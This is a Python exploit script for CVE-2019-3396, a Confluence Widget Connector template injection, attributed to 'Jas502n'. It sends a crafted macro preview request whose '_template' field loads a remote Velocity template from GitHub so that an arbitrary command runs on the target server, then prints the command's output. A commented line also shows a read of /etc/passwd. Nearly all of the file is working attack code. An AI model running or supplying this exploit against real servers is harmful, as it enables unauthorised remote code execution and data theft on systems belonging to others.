#coding=utf-8

print(r'''
 _____              __ _                             ______  _____  _____ 
/  __ \            / _| |                            | ___ \/  __ \|  ___|
| /  \/ ___  _ __ | |_| |_   _  ___ _ __   ___ ___   | |_/ /| /  \/| |__  
| |    / _ \| '_ \|  _| | | | |/ _ \ '_ \ / __/ _ \  |    / | |    |  __| 
| \__/\ (_) | | | | | | | |_| |  __/ | | | (_|  __/  | |\ \ | \__/\| |___ 
 \____/\___/|_| |_|_| |_|\__,_|\___|_| |_|\___\___|  \_| \_| \____/\____/ 
                                                                          
                                By Jas502n
                                CVE-2019-3396                                          
                                         
 ''')
import os
import sys
import re
import requests


# url = "http://10.10.20.181"
url = sys.argv[1]
cmd = sys.argv[2]

proxies = {
    "http":"http://127.0.0.1:8082",
    "https":"https://127.0.0.1:8082",
    "http":"socks5h://127.0.0.1:1080",
    "https":"socks5h://127.0.0.1:1080"
}

paylaod = url + "/rest/tinymce/1/macro/preview"

headers = {
    "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0",
    "Referer": url + "/pages/resumedraft.action?draftId=1&draftShareId=056b55bc-fc4a-487b-b1e1-8f673f280c23&",
    "Content-Type": "application/json; charset=utf-8"
}

# pyftp = "file:///etc/passwd"

pyftp = "https://raw.githubusercontent.com/Yt1g3r/CVE-2019-3396_EXP/master/cmd.vm"


data = '{"contentId":"1","macro":{"name":"widget","body":"","params":{"url":"https://www.viddler.com/v/23464dc5","width":"1000","height":"1000","_template":"%s","command":"%s"}}}' % (pyftp,cmd)
r = requests.post(paylaod, data=data, headers=headers)

# print r.content
if r.status_code == 200 and "wiki-content" in r.text:
    m = re.findall('.*wiki-content">\n(.*)\n            </div>\n', r.text, re.S)
    print "\n>>>>Usage: python test.py url cmd \n"
    print ">>>>Confluence Vuln url:  %s \n" %paylaod
    #去掉每行头尾空白
    print '>>>>Command Response:\n',m[0].strip()   

